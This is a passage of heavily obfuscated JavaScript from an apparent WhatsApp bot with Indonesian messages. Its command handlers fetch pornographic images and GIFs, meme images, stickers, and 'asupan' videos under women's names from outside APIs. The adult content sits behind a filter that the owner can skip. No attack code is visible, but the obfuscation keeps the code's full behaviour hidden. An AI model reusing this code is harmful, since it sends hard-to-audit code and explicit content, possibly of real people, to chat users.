_0x5b2fd={};_0x5b2fd['buttonId']=_0x1f7707(0x5ba,0x348,0x51d,0x30d),_0x5b2fd[_0x39f25f(0x66e,0x37c,0x431,0x304)]=_0x4f0b4e,_0x5b2fd['type']=0x1;const _0x12e8de={};_0x12e8de['displayTex'+'t']=_0x1f7707(0x85b,0xa4c,0x69e,0x951);const _0x70f9be={};_0x70f9be[_0x39f25f(0x6ee,0x647,0x6a0,0x9af)]=''+command,_0x70f9be['buttonText']=_0x12e8de,_0x70f9be['type']=0x1;const buttonsxxxxx=[_0x5b2fd,_0x70f9be],btnxxxx__={'contentText':lang['success'](),'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+'©\x20'+creator+('\x20|\x20Request'+_0x39f25f(0x583,0x2a0,0xae,0x577))+sender[_0x1f7707(0x343,0x143,0x20e,0x25a)]('@')[-0x1ed+0x1dbd+-0x1bd0],'buttons':buttonsxxxxx,'headerType':0x4,'imageMessage':bacotluxxxxx[_0x39f25f(-0x301,-0xdc,-0x3aa,0x308)][_0x1f7707(0x2b8,-0x434,-0x1fb,-0x47f)+'ge']},_0x4de736={};_0x4de736['mentionedJ'+'id']=[sender];const _0x5d8250={};_0x5d8250[_0x39f25f(0x4f1,0x106,-0x2a3,0x257)]=mek,_0x5d8250['contextInf'+'o']=_0x4de736,alpha[_0x1f7707(-0x55a,-0x526,-0x232,-0x2b7)+'e'](from,btnxxxx__,MessageType[_0x1f7707(0x33f,0x434,0x65,0x2b0)+_0x39f25f(-0x534,-0x8d,0xe1,-0x277)],_0x5d8250)[_0x1f7707(0xff,0x74c,0x54b,0x90a)](_0x25b3db=>{function _0x102a8a(_0x40f2ba,_0x384e29,_0x59f48e,_0x5b483c){return _0x1f7707(_0x40f2ba-0xec,_0x40f2ba,_0x384e29-0x677,_0x5b483c-0x149);}const _0x3918fa={'UPsYR':function(_0x128ef2,_0x396524){return _0x128ef2(_0x396524);},'mwDJP':_0xfdf051(0xb07,0x9fc,0x6af,0x5f1)+'salahan,\x20c'+_0xfdf051(0x50d,0x8ee,0x49e,0x3d0)+'pa\x20saat\x20la'+'gi'};function _0xfdf051(_0x5501bc,_0x3b384f,_0x25b3ea,_0x1f80ab){return _0x39f25f(_0x3b384f,_0x25b3ea-0x208,_0x25b3ea-0x156,_0x1f80ab-0x2b);}_0x3918fa['UPsYR'](reply,_0x3918fa[_0xfdf051(-0x12d,0x74f,0x37f,-0x8)]);});break;case _0x1f7707(0x944,0xa7e,0x624,0x7c8):case _0x1f7707(0x30,0xea,0x350,-0x64):case'bdsm':case _0x1f7707(0x2d9,-0x101,0xef,-0x24e):case _0x39f25f(0x830,0x760,0x909,0x992):case'gangbang':case _0x1f7707(-0x277,0x5d2,0x16d,0x22b):case _0x1f7707(0x773,0x35e,0x2df,0x61e):case _0x39f25f(0x4eb,0x52c,0x3bb,0x32c):case'masturbati'+'on':case'orgy':case _0x1f7707(0xbd,0x6c9,0x4e6,0x433):case _0x1f7707(0x2c8,-0x196,0x55,0x40):case _0x39f25f(-0x1bb,0xf1,0x3bb,-0x28c):case _0x1f7707(0x28e,-0x289,-0x21,0x480):if(!isNsfw)return reply(lang[_0x39f25f(0x290,-0x5a,-0x13a,-0x145)]());reply(lang[_0x39f25f(0x21a,0x22a,-0xa5,0x5bc)]());var nsfww=await fetchJson('https://ap'+_0x39f25f(-0x52,0x41,-0x2b5,-0x140)+_0x1f7707(0x7e9,0x81f,0x5da,0x74c)+_0x39f25f(-0x186,0x1df,0x1f,-0x18d)+_0x39f25f(0xa49,0x754,0x4ff,0xb52)+command+(_0x1f7707(-0x2ff,-0x170,-0x1cd,-0x113)+_0x39f25f(-0xdb,0xb6,-0x2c7,0x438)));let random_nsfww=await getBuffer(nsfww[_0x1f7707(0x62,0x24b,0x38f,0x4c2)]);const mediaxxxx=await alpha[_0x39f25f(-0x384,0xdb,-0x35b,-0x251)+_0x1f7707(-0xd6,-0x18f,-0x23b,-0x41d)](from,random_nsfww,MessageType[_0x1f7707(-0x52c,0x19b,-0x15d,-0x269)],{'thumbnail':Buffer[_0x1f7707(-0x41a,-0x359,-0xba,-0x304)](-0x2f*-0x8b+0x7*-0x2b+-0x1858)});let bacotluxxxx=mediaxxxx[_0x39f25f(0x87,-0xdc,0x30c,-0x408)][_0x1f7707(0x774,0x1db,0x427,0x506)+_0x39f25f(0x285,0x248,-0x260,0xe3)]?mediaxxxx[_0x39f25f(-0x3e0,-0xdc,-0xf8,0x3a6)][_0x1f7707(0x219,-0x87,0x427,0x2be)+_0x39f25f(0x209,0x248,0x192,0x6bc)]:mediaxxxx;const _0x4ebe8c={};_0x4ebe8c[_0x1f7707(-0xc5,0x79,-0x1ae,-0x12a)+'t']=_0x39f25f(-0x222,-0x7b,0x244,-0x32c);const _0x4a484c={};_0x4a484c[_0x1f7707(0x62d,0x946,0x499,0x6dc)]=_0x39f25f(0x758,0x6cb,0x7da,0x3ff),_0x4a484c['buttonText']=_0x4ebe8c,_0x4a484c['type']=0x1;const _0x38a4da={};_0x38a4da[_0x1f7707(-0x15b,0x25e,-0x1ae,0x301)+'t']=_0x1f7707(0x5af,0x672,0x69e,0x2a3);const _0xea5847={};_0xea5847[_0x1f7707(0x93f,0x8ad,0x499,0x1fd)]=''+command,_0xea5847[_0x1f7707(-0x1ed,-0xd,0x1ce,-0xf8)]=_0x38a4da,_0xea5847['type']=0x1;const buttonsxxxx=[_0x4a484c,_0xea5847],btnxxx__={'contentText':lang[_0x1f7707(0xa0,0x49a,0x32b,0x550)](),'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+'©\x20'+creator+('\x20|\x20Request'+_0x1f7707(0x541,0xb,0xf2,0x235))+sender[_0x39f25f(0x604,0x3bc,0x4ce,0x44b)]('@')[-0xa1b+0x71e+0x2fd],'buttons':buttonsxxxx,'headerType':0x4,'imageMessage':bacotluxxxx['message'][_0x1f7707(-0x2a9,-0x191,-0x1fb,-0xda)+'ge']},_0x29777c={};_0x29777c[_0x39f25f(0x597,0x63f,0x645,0xa0c)+'id']=[sender];const _0x3d6bd3={};_0x3d6bd3['quoted']=mek,_0x3d6bd3[_0x1f7707(0x21a,0x434,0x52f,0x1ed)+'o']=_0x29777c,alpha['sendMessag'+'e'](from,btnxxx__,MessageType['buttonsMes'+_0x39f25f(-0x4ec,-0x8d,0x13,-0x2e0)],_0x3d6bd3)[_0x39f25f(0x316,0x6f9,0x543,0x4af)](_0x17c7bd=>{function _0x4abe67(_0xea97b0,_0x3c2549,_0x24cc3c,_0x4bc048){return _0x39f25f(_0x24cc3c,_0x4bc048-0x491,_0x24cc3c-0x13c,_0x4bc048-0x160);}function _0xa1df5f(_0x452d2e,_0x457ef9,_0x201a30,_0x21f3f6){return _0x1f7707(_0x452d2e-0x9d,_0x21f3f6,_0x201a30-0x621,_0x21f3f6-0x19e);}const _0x296997={'CzAkN':function(_0x56c2ce,_0x1925ce){return _0x56c2ce(_0x1925ce);}};_0x296997[_0x4abe67(0xa01,0x895,0x6f0,0x79f)](reply,'Terjadi\x20ke'+'salahan,\x20c'+_0xa1df5f(0x3de,0x307,0x709,0x5dd)+'pa\x20saat\x20la'+'gi');});break;case _0x39f25f(0x247,0x6b3,0x5d2,0x7dc):case'smug':case _0x1f7707(0x571,0x23f,0x1cd,0x43a):case _0x39f25f(0x39c,0x6b5,0x67c,0x406):case'slap':case _0x39f25f(0x5b,-0xd8,-0x373,0x19):case _0x39f25f(0xbf,0x238,0x2a7,0x5fa):case'bj':case _0x1f7707(0xe0,0x28e,-0x10,0x11a):case _0x39f25f(0x29d,-0x10a,0xe9,0x2a7):case _0x39f25f(0xabb,0x7c4,0x3ea,0x800):case'feed':case _0x1f7707(0x9d1,0x8bb,0x668,0x5c3)+'gif':case'pussy':case _0x39f25f(0x326,0x15a,-0x5c,0x418):case'baka':case'hug,':case'kiss':case _0x1f7707(-0x2d8,0xc4,0x5c,-0x291):case _0x39f25f(0x3f5,0x2cc,-0x12d,0x20b):case _0x1f7707(-0x136,0x60d,0x31d,0x10a):case _0x1f7707(0x2fc,-0x626,-0x168,0x1d6):case _0x1f7707(0x3e2,0x55c,0x238,0x553):case _0x1f7707(-0x10b,0x3fe,-0x4,0x27):case _0x1f7707(0x914,0x34c,0x61a,0x4b5):if(!isNsfw&&!mek[_0x39f25f(-0x343,0x123,-0x3f,0x519)][_0x39f25f(0x2fb,0x4be,0x6b4,0x8ae)]&&!isOwner&&!isCreator)return reply(lang[_0x39f25f(0x293,-0x5a,-0x25c,-0x2fa)]());var ini_gif=await fetchJson('https://ne'+'kos.life/a'+_0x39f25f(0xac,0x533,0x240,0x2af)+command),ini_gif_=await getBuffer(ini_gif[_0x39f25f(0x149,0x342,0xc2,0x7a2)]);const mediax_=await alpha[_0x1f7707(-0x4ff,-0x248,-0xd3,-0x46a)+_0x39f25f(0x159,-0x8d,0xf,-0x465)](from,ini_gif_,MessageType[_0x1f7707(0x724,0x11d,0x345,-0x12b)],{'thumbnail':Buffer[_0x39f25f(-0x27,0xf4,0x253,-0xe5)](0x6*0x49d+0xa6*-0x37+0x7fc)});let bacotlux_=mediax_[_0x39f25f(0x3c8,-0xdc,0x8b,-0xd6)][_0x1f7707(0x3be,0x64d,0x427,0x6e4)+'essage']?mediax_[_0x1f7707(0x120,-0x7c,-0x28a,-0x31d)][_0x39f25f(0x4a6,0x5d5,0xa11,0x864)+'essage']:mediax_;const _0x28c4db={};_0x28c4db['displayTex'+'t']='🐨\x20Owner';const _0x1f2867={};_0x1f2867[_0x1f7707(0x150,0x73f,0x499,0x4b6)]=_0x1f7707(0x85a,0x4b1,0x51d,0x4e8),_0x1f2867[_0x1f7707(-0x11a,0x251,0x1ce,-0x2a0)]=_0x28c4db,_0x1f2867[_0x1f7707(0x3f4,0x118,0x520,0x7f6)]=0x1;const _0x2afd5c={};_0x2afd5c[_0x1f7707(-0x2f4,0x17e,-0x1ae,-0x388)+'t']=_0x39f25f(-0x2ba,0x169,-0x34c,0x513);const _0x1b733f={};_0x1b733f['buttonId']='sewa_kak',_0x1b733f[_0x39f25f(0x605,0x37c,0x1a9,0x730)]=_0x2afd5c,_0x1b733f[_0x1f7707(0x6f3,0x8cd,0x520,0x9ad)]=0x1;const buttonsx_=[_0x1f2867,_0x1b733f],btnx_={'contentText':lang[_0x1f7707(0x1cd,0x71e,0x32b,0x1ab)](),'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+'©\x20'+creator+(_0x1f7707(-0x3d2,-0x16e,0x99,-0x355)+_0x39f25f(0x1e1,0x2a0,-0x15a,0x64d))+sender[_0x39f25f(0x710,0x3bc,0x67d,0x75a)]('@')[-0x206*-0xe+-0x68c+-0x572*0x4],'buttons':buttonsx_,'headerType':0x5,'videoMessage':bacotlux_[_0x1f7707(-0x3ec,-0x5a1,-0x28a,-0x637)][_0x39f25f(-0x20c,0x185,-0x1df,0x11e)+'ge']},_0x5ddc4a={};_0x5ddc4a[_0x1f7707(0x598,-0x1d,0x491,0x6c6)+'id']=[sender];const _0x584bf7={};_0x584bf7[_0x1f7707(-0x46d,-0x55,-0xa8,0xa)]=mek,_0x584bf7[_0x39f25f(0x90d,0x6dd,0x577,0x790)+'o']=_0x5ddc4a,alpha['sendMessag'+'e'](from,btnx_,MessageType[_0x39f25f(0x39b,0x213,0x10b,0x49a)+_0x39f25f(-0x2fb,-0x8d,-0x68,0x2fc)],_0x584bf7)[_0x39f25f(0x739,0x6f9,0x453,0x6f3)](_0xd67013=>{function _0x43328a(_0x9ff641,_0x30e219,_0x21d7ec,_0x321325){return _0x39f25f(_0x9ff641,_0x21d7ec-0x2f1,_0x21d7ec-0xb5,_0x321325-0x1d9);}function _0x4455fa(_0x503231,_0x41486e,_0x51b254,_0x388f44){return _0x39f25f(_0x388f44,_0x41486e- -0x182,_0x51b254-0x17e,_0x388f44-0x165);}const _0x1f9c2a={'WlbkW':function(_0x355c78,_0x4c539b){return _0x355c78(_0x4c539b);},'uFOqV':_0x4455fa(0x546,0x325,-0x165,0x16b)+'salahan,\x20c'+'oba\x20bebera'+'pa\x20saat\x20la'+'gi'};_0x1f9c2a[_0x4455fa(0xe5,0x1ec,0x66c,-0x1f7)](reply,_0x1f9c2a[_0x4455fa(-0x204,0x27d,0x275,0x14)]);});break;case _0x39f25f(0xac6,0x79a,0x6ab,0x8ad):case _0x1f7707(-0x47c,-0x51f,-0x7d,-0x403):case _0x39f25f(0x426,0x41b,0x8a1,0x5ab):case'gasm':case'solo':case _0x1f7707(0x9e2,0x287,0x5dc,0x48a):case'goose':case'avatar':case'ero':case _0x39f25f(0x5d6,0x7f1,0x4f2,0x7f5):case _0x39f25f(-0x3d,0xce,0x499,-0x3d0):case _0x39f25f(0x5cb,0x4c3,0x2c9,0x70a):case _0x39f25f(0x9c,0x98,-0x2a0,0x9d):case _0x39f25f(0x476,0x150,0x31d,0x406):case _0x1f7707(-0x11d,-0x24f,-0x106,-0x301):case _0x1f7707(0x245,0x5a7,0x111,0x1d0):case _0x39f25f(0x71f,0x5a0,0x8cd,0x6a4):case _0x1f7707(0x27c,0xb9,0x353,0x360):case _0x1f7707(0x3ae,0x741,0x3ec,0x83f):case _0x39f25f(0x15a,0x43d,0x535,0x61f):case _0x39f25f(-0x6,0x1ab,-0x26b,-0xa4):case _0x1f7707(0x787,0x5d6,0x508,0x60e):case'erok':case _0x1f7707(-0x2e,-0x50a,-0x266,0x1f8):case _0x1f7707(-0xc3,0x4ac,0x4d,-0x178):case _0x39f25f(0x335,0x43a,0x2a1,-0x5d)+'r':case _0x39f25f(0x248,0x3be,0x3a7,0x4b1):case _0x39f25f(0x2e1,0x141,0x37d,0x94):case _0x1f7707(0x4b8,0x916,0x490,0x42a):case'blowjob':case'waifu':case _0x39f25f(-0x494,-0xe4,-0x19a,0x63):case _0x1f7707(0x1cf,-0xa4,0x3c4,0x560):case _0x39f25f(-0x2e7,-0xb4,0x30e,0x343):case _0x39f25f(0x9f3,0x6f6,0xa07,0x7c7):case _0x1f7707(0x474,0x746,0x53c,0x76e):case _0x39f25f(0x168,0x7d,0xfc,-0x36):if(!isNsfw&&!mek['key']['fromMe']&&!isOwner&&!isCreator)return reply(lang[_0x39f25f(0x17b,-0x5a,-0x1e3,0xce)]());var ini_img=await fetchJson('https://ne'+'kos.life/a'+_0x1f7707(0x2a2,0x6ac,0x385,0x218)+command),ini_img_=await getBuffer(ini_img[_0x39f25f(0x71e,0x342,0x5f1,0x19b)]);const mediax=await alpha[_0x1f7707(-0x47e,0x1b1,-0xd3,-0x286)+_0x39f25f(0x423,-0x8d,-0x8f,0x222)](from,ini_img_,MessageType['image'],{'thumbnail':Buffer[_0x1f7707(0x377,0x1a8,-0xba,-0x53e)](-0xc30+-0x73c*0x2+-0xd54*-0x2)});let bacotlux=mediax['message']['ephemeralM'+_0x1f7707(0x153,0xee,0x9a,0x4b5)]?mediax[_0x1f7707(0x85,-0x598,-0x28a,-0x246)][_0x39f25f(0x34b,0x5d5,0x7fd,0x741)+'essage']:mediax;const _0x7b046={};_0x7b046[_0x1f7707(-0x5c0,-0x3f7,-0x1ae,0x27c)+'t']='🐨\x20Owner';const _0x374845={};_0x374845[_0x1f7707(0x31f,0x1f0,0x499,0x43f)]=_0x1f7707(0x7dd,0x1ee,0x51d,0x99e),_0x374845[_0x39f25f(-0xab,0x37c,0x2fa,0x5cc)]=_0x7b046,_0x374845['type']=0x1;const _0x181128={};_0x181128['displayTex'+'t']='Next\x20➡️';const _0x4d53de={};_0x4d53de[_0x39f25f(0x644,0x647,0x4c3,0x794)]=''+command,_0x4d53de[_0x1f7707(0x58,0xf9,0x1ce,0x679)]=_0x181128,_0x4d53de[_0x1f7707(0x783,0x310,0x520,0x42d)]=0x1;const buttonsx=[_0x374845,_0x4d53de],btnx__={'contentText':lang[_0x1f7707(0x6b9,-0xc4,0x32b,-0x27)](),'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+'©\x20'+creator+(_0x39f25f(0xdb,0x247,0x3d4,0x354)+_0x39f25f(-0x1df,0x2a0,0x627,0x4ba))+sender['split']('@')[0x958+0x1d4d+-0x26a5],'buttons':buttonsx,'headerType':0x4,'imageMessage':bacotlux[_0x39f25f(0x6f,-0xdc,0x318,-0x4c4)]['imageMessa'+'ge']},_0x3a31bb={};_0x3a31bb[_0x39f25f(0x935,0x63f,0x95a,0xa63)+'id']=[sender];const _0x2092b1={};_0x2092b1[_0x1f7707(-0x2da,-0x198,-0xa8,0x77)]=mek,_0x2092b1[_0x39f25f(0x222,0x6dd,0xa1c,0x610)+'o']=_0x3a31bb,alpha[_0x39f25f(0xb2,-0x84,-0x2d9,0x50)+'e'](from,btnx__,MessageType['buttonsMes'+_0x1f7707(-0x65d,0xf,-0x23b,0xcc)],_0x2092b1)[_0x1f7707(0x13e,0x1d7,0x54b,0x41c)](_0x3c560d=>{const _0x87e6dc={'ZcsIv':function(_0xe7f5da,_0xefdda1){return _0xe7f5da(_0xefdda1);},'bHcHH':'Terjadi\x20ke'+'salahan,\x20c'+_0x11e0ea(0x31d,0x742,0x941,0x855)+_0x5f5916(0x442,0x528,0x53c,0x447)+'gi'};function _0x5f5916(_0x299d9f,_0xb89de2,_0xc45092,_0x263945){return _0x1f7707(_0x299d9f-0x15d,_0x263945,_0xb89de2-0x3e2,_0x263945-0x179);}function _0x11e0ea(_0x5dc3be,_0x2b95bc,_0x1ad571,_0x94d8b2){return _0x39f25f(_0x5dc3be,_0x2b95bc-0x4ac,_0x1ad571-0x1bd,_0x94d8b2-0x173);}_0x87e6dc[_0x5f5916(0x628,0xa51,0xa25,0xc84)](reply,_0x87e6dc[_0x5f5916(0x898,0x5c4,0x908,0x4fe)]);});break;case _0x39f25f(0x5e5,0x77f,0x996,0x691):const pref=_0x39f25f(0x92,0xd4,0x38,-0x379)+enter+(_0x39f25f(0x920,0x607,0x8e7,0x290)+_0x1f7707(0x5c9,-0x106,0x23c,-0x1c2)+_0x1f7707(-0x19,0x13a,0x49e,0x8a8)+'rue\x20/\x20not\x20'+_0x1f7707(-0x6b2,-0x475,-0x23d,-0xe4)+_0x1f7707(0x2f3,0xab,0x551,0x226)+_0x39f25f(-0x11c,-0x33,0x1f9,0x1b1)+_0x1f7707(-0x55a,-0x4ca,-0xb1,0x3d5)+_0x1f7707(0x82c,0x2fc,0x5a8,0x758)+'rkgreen|li'+_0x39f25f(-0x49f,-0xad,-0x2dd,-0x50e)+_0x1f7707(-0x5d2,-0x117,-0x24f,0x6b)+_0x39f25f(0x989,0x6fe,0x6fc,0x876)+_0x1f7707(0x142,-0x11a,0x290,0x6d2))+enter+enter+_0x39f25f(-0x3bf,0xbc,0x3b6,-0x81)+enter+'\x20'+prefix+('amongus\x20\x20c'+_0x1f7707(0x5cf,0x3c2,0x43b,0x85a)+_0x39f25f(0x56e,0x26d,-0x17b,0x553));if(args[_0x1f7707(0x3d4,0x763,0x4cc,0x7ef)]<0x1*-0x14c9+0x267f*-0x1+0x3b49)return reply(pref);var kntl_=args[_0x39f25f(0x435,0x46d,0x758,0x909)]('\x20'),nama_=kntl_[_0x39f25f(0x210,0x3bc,0x2b3,0x292)]('|')[0x1c*-0x9+0x5c4+-0x4c8],impostor_=kntl_['split']('|')[0x15*-0x183+-0xa88+0x70c*0x6],color_=kntl_[_0x1f7707(0x26,0xfc,0x20e,-0x13e)]('|')[0x11f+0x255*0x2+-0x1*0x5c7];const _0x2c86f3={};_0x2c86f3['method']='get';var amongus=await getBuffer(_0x39f25f(0x23,0x4b9,0x1d6,0x678)+_0x39f25f(0x5a5,0x5ea,0x7de,0x662)+_0x39f25f(-0x52,0x3c0,0x49b,0x752)+_0x1f7707(0x167,0x16c,0x4ed,0x8f1)+nama_+_0x39f25f(0x79c,0x337,0x36e,-0x123)+impostor_+'&crewmate='+color_,_0x2c86f3);amongusp=''+lang['success']()+enter+enter+(_0x1f7707(0x499,-0x117,0x1e1,-0xf5)+_0x1f7707(0x59f,0x482,0x563,0x217)+_0x39f25f(0x2ce,-0x12b,0x2b,0x59)+_0x39f25f(0x897,0x812,0xb1c,0xc43)+_0x39f25f(-0x14e,0x324,-0x1d,0x5f0)),alpha['sendMessag'+'e'](from,amongus,image,{'thumbnail':Buffer['alloc'](0x2a1*0x7+0x1d8f+-0x2ff6),'caption':lang[_0x1f7707(0x14a,0xfc,0x32b,0x2fa)](),'quoted':mek});break;case _0x1f7707(0x28d,0x54d,0x1ed,0x687):case _0x1f7707(0x11c,0x2cd,0x1aa,0x102):case'tweet':let trump=args[_0x39f25f(0x8b4,0x46d,0x3fa,-0x7)]('\x20');const _0xe35069={};_0xe35069[_0x1f7707(0x879,0x8be,0x457,0x307)]=_0x1f7707(-0x381,0x592,0xda,-0x16);let trump1=await fetchJson(_0x39f25f(0x770,0x715,0x518,0x326)+_0x39f25f(0x364,0x1c4,-0x26b,0x4ab)+'api/imageg'+'en?type=tr'+_0x1f7707(0x291,0x51e,0x1b4,-0x54)+_0x39f25f(0x2b8,0x387,0x621,0x102)+trump+_0x1f7707(0xff,0x6e4,0x26b,0x6d7),_0xe35069),trump2=await getBuffer(trump1[_0x39f25f(-0x16e,-0xdc,-0x4e8,0x127)]);alpha[_0x39f25f(0x394,-0x84,0x2ad,-0x3ad)+'e'](from,trump2,image,{'thumbnail':Buffer['alloc'](-0x1e5d+0x1c5e+0x1ff),'caption':lang[_0x39f25f(0x94e,0x4d9,0x79c,0x36a)](),'quoted':mek});break;case'cmm':let cmm=args['join']('\x20');const _0x5079f7={};_0x5079f7['method']=_0x39f25f(0x4ab,0x288,-0x1e6,0x65);let anuuu=await fetchJson('https://ne'+_0x39f25f(0x673,0x1c4,0x387,0x2c1)+_0x39f25f(0x260,0x577,0x39d,0x563)+_0x39f25f(0x75b,0x4ab,0x68,0x27)+'angemymind'+_0x39f25f(-0x79,0x95,0x285,-0x1c6)+cmm+_0x39f25f(0x435,0x419,0x626,-0x9a),_0x5079f7),bbuffer=await getBuffer(anuuu['message']);alpha[_0x1f7707(-0x179,0x148,-0x232,-0xbe)+'e'](from,bbuffer,image,{'thumbnail':Buffer[_0x1f7707(-0x23,-0x10f,-0xba,0x3d9)](0x505*0x7+0x105b+-0x337e),'caption':lang['success'](),'quoted':mek});break;case _0x39f25f(0x47a,0x59,-0x455,-0xff):let kanna=args[_0x1f7707(-0x23,0x678,0x2bf,0x12b)]('\x20');const _0x90fa75={};_0x90fa75['method']=_0x39f25f(-0x4c,0x288,-0x1bd,0x3af);var anu_=await fetchJson('https://ne'+_0x1f7707(-0x71,0x4c,0x16,-0x34d)+_0x39f25f(0x145,0x577,0xa30,0x22b)+_0x39f25f(0x44f,0x582,0x173,0x2b6)+_0x1f7707(-0xbf,-0x380,-0x26f,-0x36c)+'t='+kanna+'&raw=7',_0x90fa75);let buffer_h=await getBuffer(anu_['message']);alpha['sendMessag'+'e'](from,buffer_h,image,{'thumbnail':Buffer[_0x1f7707(-0x31,-0xf,-0xba,-0x4c5)](-0x14b+-0xc59+0x6d2*0x2),'caption':lang['success'](),'quoted':mek});break;case'awoawo':case'benedict':case _0x39f25f(-0x3b4,-0x10f,0x2a8,-0x58c):case _0x39f25f(0x421,0x758,0x4a2,0x2b0):case _0x39f25f(0x39a,0x6eb,0x956,0x3cc)+'g':case'doge':case _0x39f25f(0x582,0x38d,0x38a,0x602):case _0x39f25f(0x890,0x4ec,0x8bd,0xee):case _0x39f25f(0x30a,0x625,0x70c,0x3b8):case _0x39f25f(0x54f,0x5a9,0x71b,0x3e6):case _0x1f7707(-0x100,0xf0,0x1ec,0x443):case'lonte':case _0x39f25f(0xea,0x4f0,0x63a,0x485)+'di':case _0x1f7707(0x37e,-0x359,-0x9e,-0xd1):case _0x1f7707(-0x504,-0x4c8,-0x6d,-0x89):case _0x1f7707(-0x24,-0x186,0x30,0x2e1):case _0x1f7707(0x9b4,0x850,0x595,0x587):case _0x39f25f(0x3b6,0x15e,0x3a8,0x303):case _0x1f7707(0x696,-0x13b,0x1f1,-0xa7):case _0x39f25f(0xa9c,0x6ec,0x9dc,0x2d3)+'sbob':case'tyni':reply(lang['wait']());var telestc=await fetchJson(_0x39f25f(0xb30,0x73c,0x7c9,0x7e8)+_0x1f7707(-0x543,-0x53,-0x16d,-0x480)+_0x1f7707(0x1f9,0x8d2,0x5da,0xa3e)+_0x39f25f(-0x5c,0x3fa,0x6e6,0x8a7)+_0x39f25f(0x379,0x532,0x4ab,0x9e6)+_0x1f7707(0xfd,0x22d,-0x68,0x3db)+command+(_0x1f7707(0x1b1,-0x29c,-0x1cd,-0x603)+_0x1f7707(-0x61,0x108,-0xf8,-0x2ec)));let random_telestc=await getBuffer(telestc['result']);const _0x4fe5b5={};_0x4fe5b5[_0x1f7707(0x13e,-0x540,-0xa8,0x129)]=fgclink,await alpha[_0x1f7707(0x194,-0x6ba,-0x232,-0x25)+'e'](from,random_telestc,sticker,_0x4fe5b5);var ini_gopaiyy='Hi\x20'+pushname;const _0x383f1d={};_0x383f1d['displayTex'+'t']=_0x39f25f(0x42e,0x308,0x751,0x126);const _0x5d3d9b={};_0x5d3d9b['buttonId']=_0x1f7707(0x813,0xb19,0x692,0xa82),_0x5d3d9b['buttonText']=_0x383f1d,_0x5d3d9b[_0x39f25f(0x3f6,0x6ce,0x8d2,0x56a)]=0x1;const _0x159ff8={};_0x159ff8[_0x1f7707(-0x305,-0x13,-0x1ae,0x1)+'t']=_0x1f7707(0xa44,0x9c0,0x69e,0x92d);const _0x3618a9={};_0x3618a9[_0x39f25f(0x73c,0x647,0x49d,0x732)]=''+command,_0x3618a9[_0x1f7707(0x560,0x661,0x1ce,0x465)]=_0x159ff8,_0x3618a9['type']=0x1;var buttonoss=[_0x5d3d9b,_0x3618a9];const _0x1efae2={};_0x1efae2['contentTex'+'t']=ini_gopaiyy,_0x1efae2[_0x39f25f(0xa06,0x7e5,0x4a4,0xbc0)]=_0x1f7707(0x1c,0x11f,0x41c,-0x1c)+'for\x20new\x20st'+_0x39f25f(0x6f1,0x7ea,0x9e7,0x745),_0x1efae2['buttons']=buttonoss,_0x1efae2['headerType']=0x1,buttonMessagepe=_0x1efae2;const _0xe72096={};_0xe72096[_0x1f7707(0x328,0x342,0x21e,-0x12b)]='hi',_0xe72096[_0x1f7707(0x412,0x826,0x50c,0x263)+_0x39f25f(0x63a,0x1ae,0x38c,0x5b7)]=0x3b9aca00,_0xe72096['isForwarde'+'d']=!![],_0xe72096[_0x39f25f(0x749,0x688,0x503,0x407)+_0x1f7707(0x541,0x4d8,0x118,0x57b)]=!![],_0xe72096['mentionedJ'+'id']=[sender];const _0x2f63c0={};_0x2f63c0[_0x1f7707(-0x3f9,-0x1dd,-0x92,0x163)]=_0x1f7707(-0x32f,0x36c,-0xe5,-0x1cd)+'21',_0x2f63c0[_0x39f25f(0x7e0,0x6dd,0x30c,0x2bb)+'o']=_0xe72096,_0x2f63c0[_0x1f7707(0x114,-0x184,-0xa8,-0x19e)]=mek,_0x2f63c0[_0x39f25f(0x24c,0x688,0x4af,0x3d7)+'ral']=!![],alpha[_0x1f7707(0xe2,0x25c,-0x232,-0x151)+'e'](from,buttonMessagepe,MessageType[_0x1f7707(-0x7a,0x18a,0x65,0x14)+'sage'],_0x2f63c0);break;case _0x39f25f(0x13e,0x7e,0x29e,0x47f):case _0x39f25f(0x462,0x314,0x60c,0x280):case _0x1f7707(0x27d,-0xba,-0x8f,0x2fd):case _0x39f25f(0x1a6,0x235,-0xf5,0x4d5):case'aura':case'nisa':case'ziva':case _0x39f25f(0x4f6,0x42a,0x890,0x834):case _0x39f25f(0x62a,0x446,0x3f4,0x3e3):case'syania':case'riri':case _0x1f7707(0x47a,-0x13,-0x38,0x2cd):case'mama_gina':case _0x39f25f(0x2ee,-0x11d,-0x3f4,-0x4fe):case'mangayutri':case _0x1f7707(0x2c7,-0x2e7,0x4,-0x79)+'ni':case _0x1f7707(-0x1a7,-0xc1,0x13f,0x564):case _0x39f25f(0x433,-0x45,-0x1e,-0x387):case _0x1f7707(0xf4,0x25,0x485,0x21f):case _0x1f7707(0x2ce,0x438,0x5c2,0x8ae):case _0x1f7707(-0x38f,-0x414,-0x2a0,-0x539):reply(lang[_0x39f25f(-0x133,0x22a,0x1db,-0x1cd)]());var random_asupan=await getBuffer(_0x39f25f(0xa91,0x73c,0x668,0xb8c)+_0x1f7707(-0xd1,0x259,-0x16d,-0x55d)+_0x1f7707(0x5ab,0x828,0x5da,0x3cf)+_0x1f7707(0x5a,0x682,0x4b6,0x73e)+_0x39f25f(0x297,0x2e5,0x7a0,0x39c)+command+(_0x1f7707(0x20b,-0x5a1,-0x1cd,-0x41c)+'fline'));const mediaxx=await alpha[_0x39f25f(-0x2ab,0xdb,-0xe,0x385)+'sage'](from,random_asupan,MessageType[_0x39f25f(0x973,0x4f3,0x12a,0x588)],{'thumbnail':Buffer[_0x1f7707(-0x15e,-0xd1,-0xba,0x122)](-0x17e9+0x153b+0x2ae)});let bacotluxx=mediaxx['message'][_0x39f25f(0x393,0x5d5,0x675,0x482)+_0x39f25f(0xdd,0x248,-0x1f0,0xd4)]?mediaxx[_0x39f25f(-0x428,-0xdc,0x292,0x250)][_0x39f25f(0x9a6,0x5d5,0x1b6,0x69a)+'essage']:mediaxx;const _0x36b7f1={};_0x36b7f1['displayTex'+'t']=_0x1f7707(-0xdb,-0x447,-0x229,0x234);const _0x4c06b0={};_0x4c06b0['buttonId']='owner',_0x4c06b0[_0x1f7707(-0xe4,0x3e3,0x1ce,0x382)]=_0x36b7f1,_0x4c06b0['type']=0x1;const _0x396a92={};_0x396a92[_0x1f7707(-0xd0,0x1e4,-0x1ae,0x215)+'t']=_0x1f7707(0x973,0xa30,0x69e,0x588);const 